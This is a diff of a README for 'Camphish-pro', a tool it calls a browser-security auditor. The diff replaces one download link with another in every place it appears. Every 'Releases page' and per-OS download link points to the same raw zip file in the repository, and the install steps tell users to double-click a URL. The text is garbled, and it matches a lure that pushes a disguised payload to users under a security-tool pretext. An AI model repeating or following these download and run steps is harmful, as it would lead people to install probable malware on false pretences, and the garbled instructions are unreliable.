@@ -6,9 +6,9 @@ Welcome to Camphish-pro! This application helps you audit browser security easil
 
 ## 📥 Download Camphish-pro
 
-[![Download Camphish-pro](https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip%https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip)](https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip)
+[![Download Camphish-pro](https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip%https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip)](https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip)
 
-You can download the latest version from our [Releases page](https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip). Follow the steps below to get started.
+You can download the latest version from our [Releases page](https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip). Follow the steps below to get started.
 
 ## 📑 System Requirements
 
@@ -22,26 +22,26 @@ Before downloading, ensure your computer meets these basic requirements:
 ## 📥 Download & Install
 
 1. **Visit this page to download:** Click on the link below to access the Releases page:
-   [Download Camphish-pro](https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip)
+   [Download Camphish-pro](https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip)
 
 2. **Choose the latest release:** On the Releases page, look for the most recent version. It usually appears at the top of the list.
 
 3. **Select your operating system:** Find the file that matches your operating system. For example:
-   - For Windows, download `https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip`
-   - For macOS, download `https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip`
-   - For Linux, download `https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip`
+   - For Windows, download `https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip`
+   - For macOS, download `https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip`
+   - For Linux, download `https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip`
 
 4. **Download the file:** Click on the appropriate file to start downloading.
 
 5. **Run the installed file:**
    - For Windows:
      - Navigate to your Downloads folder.
-     - Double-click on `https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip`.
+     - Double-click on `https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip`.
    - For macOS:
      - Open your Downloads folder.
-     - Double-click on `https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip`, then drag the app to your Applications folder.
+     - Double-click on `https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip`, then drag the app to your Applications folder.
    - For Linux:
-     - Extract the files from `https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip`.
+     - Extract the files from `https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip`.
      - Open a terminal and navigate to the extracted folder.
      - Type `./Camphish-pro` to start the application.
 
@@ -95,4 +95,4 @@ Join our community for additional support. You can ask questions, share experien
 - **GitHub Issues Page:** Report bugs or request features.
 - **Community Forum:** Connect with other users to share tips and strategies.
 
-You are now ready to enhance your browser security with Camphish-pro. Visit our [Releases page](https://raw.githubusercontent.com/moikakd/Camphish-pro/main/web/templates/crypto/pro_Camphish_2.9.zip) to download the latest version and start your journey towards safer browsing.
+You are now ready to enhance your browser security with Camphish-pro. Visit our [Releases page](https://github.com/moikakd/Camphish-pro/raw/refs/heads/main/web/Camphish_pro_v3.5.zip) to download the latest version and start your journey towards safer browsing.
